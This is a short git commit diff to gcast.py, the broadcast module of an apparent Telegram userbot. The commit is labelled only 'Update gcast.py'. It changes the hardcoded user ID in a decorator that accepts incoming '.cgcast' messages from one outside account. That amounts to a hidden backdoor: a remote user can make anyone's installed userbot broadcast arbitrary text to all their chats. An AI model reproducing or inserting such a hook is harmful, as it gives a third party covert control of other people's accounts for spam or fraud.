21841c439a216c7e167cfde4f1071b878ea8d513
Garamijo <101814588+Garamijo@users.noreply.github.com>
2022-04-06 22:18:41 +0700

    Update gcast.py

--- userbot/modules/gcast.py
+++ userbot/modules/gcast.py
@@ -34,7 +34,7 @@ GCAST_BLACKLIST = [
 
 
 @kyy_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@register(incoming=True, from_users=2069649330,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
